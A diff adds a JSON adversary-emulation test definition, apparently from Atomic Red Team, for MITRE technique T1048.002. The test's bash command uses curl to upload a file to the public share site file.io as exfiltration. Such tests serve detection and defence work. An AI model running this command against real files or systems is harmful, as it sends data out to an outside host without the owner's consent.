@@ -1,0 +1,31 @@
+{
+    "name": "Exfiltrate data HTTPS using curl freebsd,linux or macos",
+    "description": "Exfiltrate data HTTPS using curl to file share site file.io ",
+    "supported_platforms": [
+        "macos",
+        "linux"
+    ],
+    "executor": {
+        "name": "bash",
+        "elevation_required": false,
+        "command": "curl -F 'file=@#{input_file}' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/\n",
+        "type": "Command Executor"
+    },
+    "id": "T1048.002",
+    "tactics": [
+        "Exfiltration"
+    ],
+    "technique": "Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
+    "source": "ART",
+    "uuid": "4a4f31e2-46ea-4c26-ad89-f09ad1d5fe01",
+    "arguments": {
+        "input_file": {
+            "description": "Test file to upload",
+            "type": "path",
+            "default": "PathToAtomicsFolder/T1048.002/src/artifact"
+        }
+    },
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
